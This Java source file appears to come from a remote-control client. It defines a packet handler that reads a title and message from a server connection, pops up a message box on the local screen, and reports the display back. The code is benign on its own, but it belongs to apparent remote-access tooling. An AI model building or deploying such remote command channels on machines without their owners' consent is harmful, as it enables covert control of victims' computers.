package com.redpois0n.packets;

import javax.swing.JOptionPane;
import javax.swing.UIManager;

import com.redpois0n.Connection;
import com.redpois0n.Constants;


public class PacketMSGBOX extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		boolean theme = Boolean.parseBoolean(Connection.readLine());
		if (theme) {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		final int mode = Integer.parseInt(Connection.readLine());
		final String title = Connection.readLine();
		final String message = Connection.readLine();
		new Thread() {
			public void run() {
				Connection.status(Constants.STATUS_DISPLAYED_MSGBOX);
				JOptionPane.showMessageDialog(null, message, title, mode);
			}
		}.start();
	}

}
